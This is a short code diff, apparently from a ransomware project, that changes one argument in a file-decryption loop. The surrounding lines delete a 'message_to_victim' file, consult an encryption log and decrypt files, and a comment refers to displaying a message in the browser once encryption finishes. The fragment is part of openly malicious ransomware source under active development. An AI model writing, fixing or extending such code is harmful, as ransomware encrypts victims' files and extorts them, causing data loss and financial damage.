@@ -74,7 +74,7 @@ def main(argv):
                     if filename == os.path.join(root, message_to_victim):
                         os.remove(filename)
                     elif checkLog(filename[:-10]):
-                        deleteFromLog(filename)
+                        deleteFromLog(filename[:-10])
                         decrypt(key, mode, filename)
 
     # When encryption is finished, open the browser and display the message.
